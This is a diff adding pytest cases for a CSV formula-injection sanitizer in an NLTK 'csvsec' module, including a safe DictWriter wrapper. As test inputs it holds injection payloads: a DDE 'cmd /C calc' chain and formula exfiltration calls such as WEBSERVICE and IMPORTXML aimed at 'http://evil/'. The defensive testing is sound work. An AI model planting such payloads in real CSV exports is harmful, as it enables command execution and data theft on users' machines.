@@ -26,7 +26,9 @@ import pytest
 
 from nltk.csvsec import (
     _MAX_NUMERIC_CELL_LEN,
+    SafeCsvDictWriter,
     SafeCsvWriter,
+    safe_csv_dict_writer,
     safe_csv_writer,
     sanitize_csv_field,
 )
@@ -156,6 +158,111 @@ class TestTypeSweepOnePipelineNoBranches:
 
         assert sanitize_csv_field(Fraction(1, 3)) == "1/3"
         assert sanitize_csv_field(complex(1, 2)) == "(1+2j)"
+
+
+class TestResearchDrivenLeads:
+    """Lead set from the cross-ecosystem evidence: % and | (the Ruby csv-safe
+    sanitizer earned CVE-2022-28481 by missing them) and OWASP's fullwidth
+    forms. The neutralisation is the apostrophe, never a TAB (Symfony's TAB
+    prefix was itself CVE-2021-41270), and mid-cell text is never rewritten."""
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "%PROGRAMDATA%\\evil",
+            "|calc",
+            chr(0xFF1D) + "cmd()",
+            chr(0xFF0B) + "1+cmd",
+            chr(0xFF0D) + "1+cmd",
+            chr(0xFF20) + "SUM(1)",
+        ],
+    )
+    def test_extended_leads_defused(self, payload):
+        out = sanitize_csv_field(payload)
+        assert out.startswith("'"), out
+
+    def test_gitlab_h1_payload_verbatim(self):
+        # hackerone 216243: the classic DDE chain; the apostrophe defuses the
+        # lead and the pipes stay untouched (no data mangling)
+        out = sanitize_csv_field("=cmd|' /C calc'!A0")
+        assert out == "'=cmd|' /C calc'!A0"
+
+    @pytest.mark.parametrize(
+        "fn",
+        ["WEBSERVICE", "HYPERLINK", "IMPORTXML", "IMPORTDATA", "IMAGE", "DDE"],
+    )
+    def test_exfiltration_family_defused(self, fn):
+        out = sanitize_csv_field("=" + fn + '("http://evil/",A1)')
+        assert out.startswith("'=")
+
+    def test_prefix_is_apostrophe_never_tab(self):
+        out = sanitize_csv_field("=x")
+        assert out[0] == "'" and "\t" not in out
+
+    @pytest.mark.parametrize(
+        "benign", ["100%", "50% off", "a|b", "x % y", "pipe|in|middle"]
+    )
+    def test_no_lead_means_untouched(self, benign):
+        assert sanitize_csv_field(benign) == benign
+
+
+class TestGroupedNumbers:
+    """Accounting-style grouped negatives stay numbers (defusedcsv parity);
+    anything beyond digits and , . grouping keeps the defusal."""
+
+    @pytest.mark.parametrize(
+        "num", ["-1,234", "-1,234.56", "+1,000", "-1.234,56", "-1,2,3"]
+    )
+    def test_grouped_negatives_kept(self, num):
+        assert sanitize_csv_field(num) == num
+
+    @pytest.mark.parametrize(
+        "bad", ["-1,2(3)", "-1,234=SUM(A1)", "-,,", "+.,", chr(0xFF0D) + chr(0xFF13)]
+    )
+    def test_non_numbers_with_lead_still_defused(self, bad):
+        assert sanitize_csv_field(bad).startswith("'")
+
+    def test_grouped_number_over_cap_defused(self):
+        big = "-" + "1," * (_MAX_NUMERIC_CELL_LEN)
+        assert sanitize_csv_field(big).startswith("'")
+
+
+class TestSafeCsvDictWriter:
+    def test_values_and_header_defused_keys_intact(self):
+        buf = io.StringIO()
+        w = safe_csv_dict_writer(buf, ["name", "=evil"])
+        w.writeheader()
+        w.writerow({"name": "=SUM(A1)", "=evil": ESC + "[2J"})
+        buf.seek(0)
+        rows = list(csv.reader(buf))
+        assert rows[0] == ["name", "'=evil"]  # header cell defused
+        assert rows[1][0] == "'=SUM(A1)"
+        assert ESC not in rows[1][1]
+
+    def test_restval_is_defused(self):
+        buf = io.StringIO()
+        w = SafeCsvDictWriter(buf, ["a", "b"], restval="=missing")
+        w.writerow({"a": "x"})
+        buf.seek(0)
+        (row,) = list(csv.reader(buf))
+        assert row == ["x", "'=missing"]
+
+    def test_extrasaction_ignore_passthrough(self):
+        buf = io.StringIO()
+        w = SafeCsvDictWriter(buf, ["a"], extrasaction="ignore")
+        w.writerows([{"a": "=x", "junk": "=y"}])
+        buf.seek(0)
+        (row,) = list(csv.reader(buf))
+        assert row == ["'=x"]
+
+    def test_single_line_forwarding_and_dialect(self):
+        buf = io.StringIO()
+        w = safe_csv_dict_writer(buf, ["a"], single_line=True)
+        w.writerow({"a": "x\ny"})
+        assert w.dialect.delimiter == ","
+        buf.seek(0)
+        (row,) = list(csv.reader(buf))
+        assert row == ["x\\x0ay"]
 
 
 class TestSingleLineForwarding:
